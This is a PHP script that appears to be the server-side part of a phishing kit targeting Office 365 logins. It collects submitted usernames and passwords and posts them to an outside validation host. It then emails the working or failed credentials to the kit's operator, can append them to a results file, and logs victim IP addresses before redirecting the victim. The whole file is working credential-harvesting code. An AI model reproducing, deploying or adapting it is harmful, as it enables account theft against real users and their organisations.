<?php
session_start();
//error_reporting(0);
require('../config.php');
include('../engine/sender.php');

if ($_GET['w'] == "red") {
    $url = $_SESSION['redirect'];
    if ($playsound==1){
    
    header( "Location: $sound");
}else{
   header("Location: $url");
    exit;
}}


if (!empty($_POST['user']) && !empty($_POST['pass'])) {
    $sub1 = "Office Good";
    $sub2 = "Office Bad";
    $curlz = curl_init();
    $User = strtolower($_POST['user']);
    $pass = $_POST['pass'];
    curl_setopt_array($curlz, array(
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_URL => 'http://check365.wmscom.info/true/365.php',
        CURLOPT_USERAGENT => 'NE - Checking Bot',
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => array(
            user => "$User",
            pass => "$pass",
            smtp => "smtp.office365.com",
        )
    ));
    $respz = curl_exec($curlz);
    curl_close($curlz);
    echo $respz;

    if ($respz == "OK") {
        
        sendlogindetails($User,$pass,$to,$sub1);

        if ($Res2File) {
            file_put_contents($ResFileName, $msg, FILE_APPEND);
        }
        $resIPfile = json_decode(file_get_contents('../funcs/RES_IP.json'), true);
        if (!in_array($_SESSION['IP'], $resIPfile)) {
            $resIPfile[] = $_SESSION['IP'];
            file_put_contents('../funcs/RES_IP.json', json_encode($resIPfile));
        }
        // session_destroy();
    }else{
        if ($sendwrongpass==1){
        
      sendlogindetails($User,$pass,$to,$sub2);  
        }
    
    }
}
